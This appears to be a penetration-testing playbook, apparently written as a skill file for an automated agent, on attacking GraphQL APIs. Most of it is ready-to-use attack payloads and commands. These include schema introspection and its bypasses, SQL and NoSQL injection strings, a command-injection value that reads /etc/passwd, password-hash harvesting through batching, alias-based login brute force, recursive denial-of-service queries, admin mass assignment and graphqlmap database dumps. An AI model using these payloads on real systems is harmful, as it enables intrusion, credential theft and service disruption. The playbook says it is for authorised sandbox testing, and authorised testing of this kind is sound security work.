# GraphQL API Security Testing — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application)
**OWASP Mapping:** A03:2021 – Injection, A01:2021 – Broken Access Control
**Last Updated:** 2026-07-08

---

## Metadata

```yaml
skill_id: graphql-testing-v1
category: api-security
author: HiveBreach
mitre_attack_id: T1190
owasp_mapping:
  - A03:2021-Injection
  - A01:2021-BrokenAccessControl
tags:
  - graphql
  - api
  - injection
  - introspection
  - dos
  - T1190
tools:
  - graphql-playground
  - graphiql
  - inql
  - graphqlmap
  - clairvoyance
  - burp-suite
verification_required: sandbox
```

---

## 1. Discovery & Introspection

### 1.1 Endpoint Discovery

Common GraphQL endpoints:

```
/graphql
/graphiql
/gql
/v1/graphql
/query
/explorer
/playground
/api
/api/graphql
```

### 1.2 Introspection Query

If introspection is enabled, you can dump the entire schema:

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
        args {
          name
          type {
            name
            kind
            ofType {
              name
              kind
            }
          }
        }
      }
    }
    directives {
      name
      description
      locations
    }
  }
}
```

### 1.3 Detection via Response

```bash
# Check response for GraphQL indicators
curl -s https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"query { __typename }"}'

# If 200 OK with {"data":{"__typename":"Query"}} → GraphQL endpoint found

# Test if introspection is disabled
curl -s https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"query { __schema { types { name } } }"}'

# If error suggests disabling introspection, try obfuscation
```

### 1.4 Introspection Bypass Techniques

```graphql
# Fragment-based bypass
query {
  __schema {
    types {
      name
      fields {
        name
        ... on __Type {
          fields {
            name
          }
        }
      }
    }
  }
}
```

```graphql
# Alias-based bypass
query {
  a: __schema { types { name } }
  b: __schema { types { fields { name } } }
}
```

### 1.5 Tool-Assisted Schema Extraction

**clairvoyance** (introspection disabled):
```bash
clairvoyance -u https://target.com/graphql -w /usr/share/seclists/Discovery/Web-Content/graphql.txt -o schema.json
```

**inql** (Burp extension):
- Install inql from BApp store
- Right-click GraphQL request → Send to inql
- Explore schema, queries, mutations in the inql tab

---

## 2. Common Vulnerabilities

### 2.1 Injection Attacks

#### SQL Injection via GraphQL Arguments
```graphql
# If resolver passes args directly to SQL query
query {
  user(id: "1' OR '1'='1") {
    email
    password
  }
}
```

#### NoSQL Injection
```graphql
# MongoDB injection via JSON object
query {
  user(credentials: "{ \"$ne\": null }") {
    email
    password
  }
}
```

#### Command Injection
```graphql
# If argument is passed to shell
mutation {
  downloadReport(format: "pdf; cat /etc/passwd") {
    url
  }
}
```

### 2.2 Broken Access Control (Batching Attack)

GraphQL batching allows querying many records in one request, bypassing rate limits:

```graphql
query {
  user1: user(id: 1) { email passwordHash }
  user2: user(id: 2) { email passwordHash }
  user3: user(id: 3) { email passwordHash }
  # ... hundreds more
  user100: user(id: 100) { email passwordHash }
}
```

### 2.3 Deep Recursion (DoS)

```graphql
query {
  user(id: 1) {
    friends {
      user {
        friends {
          user {
            friends {
              user {
                friends {
                  user {
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### 2.4 Circular Query (DoS)

```graphql
query Circular {
  __type(name: "__type") {
    fields {
      type {
        fields {
          type {
            fields {
              type {
                name
              }
            }
          }
        }
      }
    }
  }
}
```

### 2.5 Field Duplication (Over-Fetching)

```graphql
# Requesting fields that are expensive to resolve
query {
  user(id: 1) {
    posts {
      comments {
        likes {
          user {
            profile {
              address {
                geoLocation {
                  latitude
                  longitude
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### 2.6 Information Disclosure via Error Messages

```graphql
# Send invalid input and examine error
mutation {
  login(username: null, password: null) {
    token
  }
}
```

Look for:
- Stack traces
- SQL queries
- Internal variable names
- File paths

### 2.7 Insecure Direct Object Reference (IDOR)

```graphql
query {
  user(id: 1) { email }
}
# Then try incrementing IDs
query {
  user(id: 2) { email }
  user(id: 3) { email }
  user(id: 4) { email }
}
```

---

## 3. Abuse of Mutations

### 3.1 Mass Assignment

```graphql
# If mutation accepts arbitrary fields
mutation {
  updateUser(id: 1, input: {
    role: "admin"
    isAdmin: true
    emailVerified: true
    creditBalance: 999999
  }) {
    id
    role
  }
}
```

### 3.2 Password Reset Abuse

```graphql
# Attempt to reset another user's password
mutation {
  requestPasswordReset(email: "target@company.com") {
    success
  }
}
```

### 3.3 Rate Limit Bypass via Aliases

```graphql
mutation {
  a: login(username: "admin", password: "pass1") { token }
  b: login(username: "admin", password: "pass2") { token }
  c: login(username: "admin", password: "pass3") { token }
  # ... up to batch-brute limit
  z: login(username: "admin", password: "pass26") { token }
}
```

---

## 4. Tool-Specific Guidance

### 4.1 graphqlmap

```bash
# Dump schema
python graphqlmap.py -u https://target.com/graphql

# Dump database
python graphqlmap.py -u https://target.com/graphql --dump

# Specific query
python graphqlmap.py -u https://target.com/graphql -q "{ users { email } }"
```

### 4.2 Burp Suite

**Install extensions:**
- inql — GraphQL schema exploration
- GraphQL Raider — Tab with schema viewer, query builder
- BatchQL — Automated batch testing

**Workflow:**
1. Proxy captures GraphQL request
2. Send to GraphQL Raider tab
3. Explore schema via introspection
4. Generate queries from schema
5. Test for injection, IDOR, access control

### 4.3 curl / Manual

```bash
# Basic query
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"query":"query { user(id: 1) { email } }","variables":{}}'

# Mutation with variables
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation Login($email: String!, $pass: String!) { login(email: $email, password: $pass) { token } }","variables":{"email":"admin@test.com","password":"test123"}}'

# Batch query
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"query { user(id: 1) { email } }"},{"query":"query { user(id: 2) { email } }"}]'
```

---

## 5. Finding Checklist

- [ ] Introspection enabled / schema extracted
- [ ] SQL injection in GraphQL arguments
- [ ] NoSQL injection in GraphQL arguments
- [ ] Command injection in mutation arguments
- [ ] Batching attack allowed (access control bypass)
- [ ] Recursive query DoS possible
- [ ] Field over-fetching (expensive resolvers)
- [ ] Error information disclosure
- [ ] IDOR in query/mutation arguments
- [ ] Mass assignment via mutations
- [ ] Rate limit bypass via aliases
- [ ] Auth token in URL / logging

---

## 6. PoC Generation

### Template

```markdown
## [FINDING_ID] — GraphQL Introspection Enabled

**Endpoint:** `https://target.com/graphql`
**Method:** POST
**Severity:** Medium

### Vector
Introspection was enabled, allowing full schema disclosure including:
- All query types
- All mutations
- All field names, types, arguments
- Input type structures

### Payload
```graphql
query { __schema { types { name fields { name } } } }
```

### Evidence
- Full schema exported to `evidence/schema.json`
- 160 types, 840 fields, 21 mutations

### Impact
- Attackers can enumerate every database entity and field
- Discovers hidden mutations (admin functions, debug endpoints)
- Maps access control model for abuse

### Remediation
- Disable introspection in production: `graphql({ introspection: false })`
- Use allow-list in production Gateways
```

---

## 7. Verification

- [ ] All findings reproduced in sandbox API instance
- [ ] Introspection disabled confirmed in production
- [ ] Depth limit confirmed / tested
- [ ] Rate limits confirmed / tested
- [ ] Auth bypasses confirmed via token manipulation
- [ ] Impact of each finding scoped (read vs write vs admin)
- [ ] Dumped schema does not contain secrets

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
